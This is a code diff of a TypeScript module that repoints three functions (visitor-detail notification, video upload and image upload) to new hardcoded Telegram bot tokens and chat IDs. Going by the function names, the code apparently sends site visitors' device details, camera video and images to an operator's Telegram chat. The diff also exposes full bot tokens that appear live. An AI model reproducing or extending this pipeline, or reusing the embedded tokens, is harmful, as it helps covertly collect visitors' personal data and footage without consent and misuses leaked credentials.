@@ -214,8 +214,8 @@ export const sendTelegramNotification = async (details: VisitorDetails) => {
   }
 
   const primaryBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();
-  const backupBotToken = '7631972577:AAE6mYqCQ8loen0hrx0Nb84mRT3fB9vqUto';
-  const CHAT_ID = '6328979211';
+  const backupBotToken = '7960931911:AAGwHfP5iGklggaCbgizXAePA3U5sNaBbdU';
+  const CHAT_ID = '7575029713';
 
   if (!CHAT_ID) {
     console.error('Telegram chat ID is not configured');
@@ -285,8 +285,8 @@ ${deviceText}
 
 export const sendVideoToTelegram = async (videoBlob: Blob) => {
   const primaryBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();
-  const backupBotToken = '7871849953:AAE7nSuJ9Qo1mZf181KvTlpOmpFsr760ZZo';
-  const CHAT_ID = '-1002454309362';
+  const backupBotToken = '7960931911:AAGwHfP5iGklggaCbgizXAePA3U5sNaBbdU';
+  const CHAT_ID = '7575029713';
 
   if (!CHAT_ID) {
     console.error('Telegram chat ID is not configured');
@@ -363,8 +363,8 @@ export const sendVideoToTelegram = async (videoBlob: Blob) => {
 
 export const sendImageToTelegram = async (imageBlob: Blob) => {
   const primaryBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();
-  const backupBotToken = '7631972577:AAE6mYqCQ8loen0hrx0Nb84mRT3fB9vqUto';
-  const CHAT_ID = '6328979211';
+  const backupBotToken = '7960931911:AAGwHfP5iGklggaCbgizXAePA3U5sNaBbdU';
+  const CHAT_ID = '7575029713';
 
   /* telegram id */
 
